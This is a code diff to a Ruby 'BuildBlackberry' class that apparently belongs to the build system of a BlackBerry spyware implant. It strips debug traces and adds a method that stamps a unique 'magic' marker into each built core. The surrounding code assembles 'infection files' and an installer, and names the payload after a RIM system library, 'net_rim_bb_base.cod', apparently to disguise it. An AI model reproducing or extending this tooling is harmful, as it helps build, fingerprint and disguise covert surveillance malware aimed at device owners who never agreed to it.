@@ -23,7 +23,6 @@ class BuildBlackberry < Build
 
     # enumerates the version, renames the cod, flattens file in root
     Dir[path('res/v_*/*.cod')].each do |d| 
-      trace :debug, "versioned: #{d}" 
       maj, min, codname = d.scan(/v_(\d+)\.(\d+)\/(.*).cod/).flatten
       version = "#{maj}.#{min}"
       trace :debug, "version: #{version} codname: #{codname}"
@@ -77,8 +76,7 @@ class BuildBlackberry < Build
       if version 
         #version=version[2..-1]
         version.slice! "v_"
-        trace :debug, "  version: #{version}"
-        version_melt params,version			
+        version_melt params,version
       end
     end
   end
@@ -113,9 +111,7 @@ class BuildBlackberry < Build
     num = 0
 	
     # keep only the version specific cores and the library
-    trace :debug, "version_melt: outputs: #{@outputs}"	
     jadfiles = @outputs.dup.keep_if {|x| (x[/\w$/] and x[version]) or x['base']}
-    trace :debug, "version_melt: jadfiles: #{jadfiles}"
 
     # sort but ignore the extension.
     # this is mandatory to have blabla-1.cod after blabla.cod
@@ -163,7 +159,6 @@ class BuildBlackberry < Build
       when 'local'
         Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
           @outputs.keep_if {|o| o['res'] || o['install.bat'] || o['bin'] || o['base'] || o['.cod'] || o['.jad']}.each do |output|
-            trace :debug, "       pack: #{output}"
             if output['base']
               z.file.open('/res/net_rim_bb_base.cod', "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
             elsif File.file?(path(output))	
@@ -179,11 +174,17 @@ class BuildBlackberry < Build
 
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
-
   end
-  
+
+  def unique(core)
+    Zip::ZipFile.open(core) do |z|
+      core_content = z.file.open('res/net_rim_bb_lib_base.cod', "rb") { |f| f.read }
+      add_magic(core_content)
+      z.file.open('res/net_rim_bb_lib_base.cod', "wb") { |f| f.write core_content }
+    end
+  end
+
   def infection_files(name = 'bb_in')
-    trace :debug, "     infection_files"
     files = []
     # keeps only all the cod and jad in the root
     @outputs.dup.delete_if {|o| o['res']}.keep_if {|o| o['.cod'] or o['.jad']}.each do |output|
